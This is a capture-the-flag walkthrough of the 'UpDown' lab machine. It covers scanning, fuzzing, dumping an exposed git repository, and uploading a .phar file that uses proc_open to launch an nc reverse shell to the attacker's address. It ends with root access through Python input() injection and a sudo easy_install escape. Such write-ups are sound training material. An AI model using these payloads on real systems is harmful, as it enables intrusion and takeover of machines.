# UpDown

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 5000 10.129.227.227
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-08 07:39 EDT
Nmap scan report for 10.129.227.227
Host is up (0.0060s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

### Siteisup.htb

Port 80 hosts an application that checks whether a website is up.

<figure><img src="../../../.gitbook/assets/image (613).png" alt=""><figcaption></figcaption></figure>

We can use `nc` listener and use a URL that points to our machine.

```
$ nc -lvnp 80                            
listening on [any] 80 ...
connect to [10.10.14.13] from (UNKNOWN) [10.129.227.227] 43088
GET / HTTP/1.1
Host: 10.10.14.13
User-Agent: siteisup.htb
Accept: */*
```

We can first add `siteisup.htb` to our `/etc/hosts` file, then we can do both `wfuzz` subdomain fuzzing and `gobuster` directory scans.&#x20;

`wfuzz` scan reveals a `dev` subdomain.

```
$ wfuzz -c -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H 'Host:FUZZ.siteisup.htb' --hw=93 -u http://siteisup.htb
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://siteisup.htb/
Total requests: 100000

=====================================================================
ID           Response   Lines    Word       Chars       Payload                     
=====================================================================

000000022:   403        9 L      28 W       281 Ch      "dev"
```

However, we aren't allowed to visit this site yet as it returns us a 403.

```
$ curl http://dev.siteisup.htb                      
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access this resource.</p>
<hr>
<address>Apache/2.4.41 (Ubuntu) Server at dev.siteisup.htb Port 80</address>
</body></html>
```

The `gobuster` scan also reveals another directory:

```
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u http://siteisup.htb -t 100
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://siteisup.htb
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Timeout:                 10s
===============================================================
2023/05/08 07:43:25 Starting gobuster in directory enumeration mode
===============================================================
/dev                  (Status: 301) [Size: 310] [--> http://siteisup.htb/dev/]
```

Another `gobuster` scan using few different wordlists reveals there's a `.git` repository present:

```
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://siteisup.htb/dev -t 100 
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://siteisup.htb/dev
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Timeout:                 10s
===============================================================
2023/05/08 07:45:02 Starting gobuster in directory enumeration mode
===============================================================
/.git/logs/           (Status: 200) [Size: 1143]
/.git/index           (Status: 200) [Size: 521]
/index.php            (Status: 200) [Size: 0]
/.git/config          (Status: 200) [Size: 298]
/.git/HEAD            (Status: 200) [Size: 21]
```

We can download all the files using `wget -r`, then we can view the files present:

```
$ git ls-files --stage                                            
100644 b317ab51e331425e460e974903462a3dcdccc878 0       .htaccess
100644 940a3179aa882a0b1ac3ff665797818e9aa68a0c 0       admin.php
100644 09e4ccd27f706d9f848cc13581699fdab694ff82 0       changelog.txt
100644 20a2b359105529ee120796c446ff68e6d8a46bfe 0       checker.php
100644 32eeeee1c38e7a3d5766f6919c34843dadaa53b5 0       index.php
100644 3b6b838805812d0b0690699f244aeced9709b5b6 0       stylesheet.css
```

Reading the `.htaccess` file reveals why we were blocked the first time:

```
$ git cat-file -p b317ab51e331425e460e974903462a3dcdccc878
SetEnvIfNoCase Special-Dev "only4dev" Required-Header
Order Deny,Allow
Deny from All
Allow from env=Required-Header
```

We need to have a special HTTP header in order to be verified. We can use the Modify Header Value Firefox extension to create a new header `Special-Dev` with the value of `only4dev`.&#x20;

{% embed url="https://addons.mozilla.org/en-US/firefox/addon/modify-header-value/" %}

Then we can view the site:

<figure><img src="../../../.gitbook/assets/image (1428).png" alt=""><figcaption></figcaption></figure>

### Execute PHP Code

There is probably a PHP file upload vulnerability to exploit here. We can do some basic source code analysis using the Git repository we found earlier. Within the `checker.php` file, we can view the code that responsible for this file upload:

```php
<?php

function isitup($url){
        $ch=curl_init();
        curl_setopt($ch, CURLOPT_URL, trim($url));
        curl_setopt($ch, CURLOPT_USERAGENT, "siteisup.htb beta");
        curl_setopt($ch, CURLOPT_HEADER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_TIMEOUT, 30);
        $f = curl_exec($ch);
        $header = curl_getinfo($ch);
        if($f AND $header['http_code'] == 200){
                return array(true,$f);
        }else{
                return false;
        }
    curl_close($ch);
}

if($_POST['check']){
  
        # File size must be less than 10kb.
        if ($_FILES['file']['size'] > 10000) {
        die("File too large!");
    }
        $file = $_FILES['file']['name'];

        # Check if extension is allowed.
        $ext = getExtension($file);
        if(preg_match("/php|php[0-9]|html|py|pl|phtml|zip|rar|gz|gzip|tar/i",$ext)){
                die("Extension not allowed!");
        }
  
        # Create directory to upload our file.
        $dir = "uploads/".md5(time())."/";
        if(!is_dir($dir)){
        mkdir($dir, 0770, true);
    }
  
  # Upload the file.
        $final_path = $dir.$file;
        move_uploaded_file($_FILES['file']['tmp_name'], "{$final_path}");

  # Read the uploaded file.
        $websites = explode("\n",file_get_contents($final_path));

        foreach($websites as $site){
                $site=trim($site);
                if(!preg_match("#file://#i",$site) && !preg_match("#data://#i",$site) && !preg_match("#ftp://#i",$site)){
                        $check=isitup($site);
                        if($check){
                                echo "<center>{$site}<br><font color='green'>is up ^_^</font></center>";
                        }else{
                                echo "<center>{$site}<br><font color='red'>seems to be down :(</font></center>";
                        }
                }else{
                        echo "<center><font color='red'>Hacking attempt was detected !</font></center>";
                }
        }

  # Delete the uploaded file.
        @unlink($final_path);
}

function getExtension($file) {
        $extension = strrpos($file,".");
        return ($extension===false) ? "" : substr($file,$extension+1);
}
?>
```

The website seems to take a bunch of websites specified within the file as specified by the `foreach` loop, then checks if all of them are alive. The file extension check can be bypassed using `.phar`, and the check on whether the site is legit can be bypassed by **having a lot of websites within our file**.

Because it checks each site manually to see if it is alive, we can actually embed a PHP payload within a long text file. As the file checks each of the sites manually, it would detect our PHP payload later, and we can still view the file and get our PHP code to execute.

This is the test file I used:

<figure><img src="../../../.gitbook/assets/image (894).png" alt=""><figcaption></figcaption></figure>

There's about 2000 lines within this. When the file is uploaded, it hangs for a long me. Then, we can head to `/uploads` to view the file uploaded.

<figure><img src="../../../.gitbook/assets/image (232).png" alt=""><figcaption></figcaption></figure>

We can then verify that our PHP code is indeed executed, and the rest of the websites have yet to be evauluated.

<figure><img src="../../../.gitbook/assets/image (3874).png" alt=""><figcaption></figcaption></figure>

When viewing this, we can find that there's a lot of `disabled_functions` present:

<pre data-overflow="wrap"><code><strong>pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,pcntl_unshare,error_log,system,exec,shell_exec,popen,passthru,link,symlink,syslog,ld,mail,stream_socket_sendto,dl,stream_socket_client,fsockopen
</strong></code></pre>

Functions like `shell_exec`, `passthru` and `system` are all blocked, meaning we cannot get a reverse shell using this. We can use Hacktricks's list of useful PHP functions to see which are not disabled:

{% embed url="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass" %}

The `proc_open` function has not been disabled, so we can use that to get a reverse shell. Searching for `proc_open` PHP reverse shell returns this:

{% embed url="https://brigzzy.ca/Pentesting/Tools/php-reverse-shell/" %}

We can certainly use snippets of this and PHP code to get a reverse shell. Instead, we can change the command to run `mkfifo` shell:

```php
<?php
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("file", "/tmp/error-output.txt", "a") // stderr is a file to write to
);

$cwd = '/tmp';
$env = array('some_option' => 'aeiou');

$process = proc_open('sh', $descriptorspec, $pipes, $cwd, $env);

if (is_resource($process)) {

    fwrite($pipes[0], 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.13 4444 >/tmp/f');
    fclose($pipes[0]);

    echo stream_get_contents($pipes[1]);
    fclose($pipes[1]);

    // It is important that you close any pipes before calling
    // proc_close in order to avoid a deadlock
    $return_value = proc_close($process);

    echo "command returned $return_value\n";
}
?>
```

Embed this within our long text file, and when visited in `/uploads`, we will get a reverse shell:

<figure><img src="../../../.gitbook/assets/image (3173).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### SiteisUp.py

There's one user within the machine:

```
www-data@updown:/home$ ls -la
total 12
drwxr-xr-x  3 root      root      4096 Jun 22  2022 .
drwxr-xr-x 19 root      root      4096 Aug  3  2022 ..
drwxr-xr-x  6 developer developer 4096 Aug 30  2022 developer

www-data@updown:/home/developer$ ls
dev  user.txt
```

We can't read the user flag, but we can view the `/dev` directory within it.&#x20;

```
www-data@updown:/home/developer/dev$ ls -la
total 32
drwxr-x--- 2 developer www-data   4096 Jun 22  2022 .
drwxr-xr-x 6 developer developer  4096 Aug 30  2022 ..
-rwsr-x--- 1 developer www-data  16928 Jun 22  2022 siteisup
-rwxr-x--- 1 developer www-data    154 Jun 22  2022 siteisup_test.py
```

It seems that there's an SUID binary in the form of a Python file, and the source code is readable:

```python
www-data@updown:/home/developer/dev$ cat siteisup_test.py 
import requests

url = input("Enter URL here:")
page = requests.get(url)
if page.status_code == 200:
        print "Website is up"
else:
        print "Website is down"
```

When trying to run the script, I noticed there was a string error:

```
www-data@updown:/home/developer/dev$ ./siteisup
Welcome to 'siteisup.htb' application

Enter URL here:http://10.10.14.13
Traceback (most recent call last):
  File "/home/developer/dev/siteisup_test.py", line 3, in <module>
    url = input("Enter URL here:")
  File "<string>", line 1
    http://10.10.14.13
        ^
SyntaxError: invalid syntax

www-data@updown:/home/developer/dev$ ./siteisup
Welcome to 'siteisup.htb' application

Enter URL here:"http://10.10.14.13"
Website is up
```

This occurs because the argument is directed taken from the user's input and passed into the next line. The script only works if we specify it as a string. Because of how it handles user input, this makes it vulnerable to Python code injection.&#x20;

We have to import the `os` library, and since we cannot do so statically using `import`, we have to dynamically do it using `__import__`.&#x20;

<figure><img src="../../../.gitbook/assets/image (2447).png" alt=""><figcaption></figcaption></figure>

We can the nread the user's private SSH key and SSH in to upgrade our shell. We can also grab the user flag.&#x20;

### Easy\_Install

Checking `sudo` privileges, we find that we can run `easy_install`:

```
developer@updown:~$ sudo -l
Matching Defaults entries for developer on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User developer may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/local/bin/easy_install
```

GTFOBins has a script for this binary.&#x20;

```bash
TF=$(mktemp -d)
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
sudo easy_install $TF
```

<figure><img src="../../../.gitbook/assets/image (358).png" alt=""><figcaption></figcaption></figure>

Rooted!
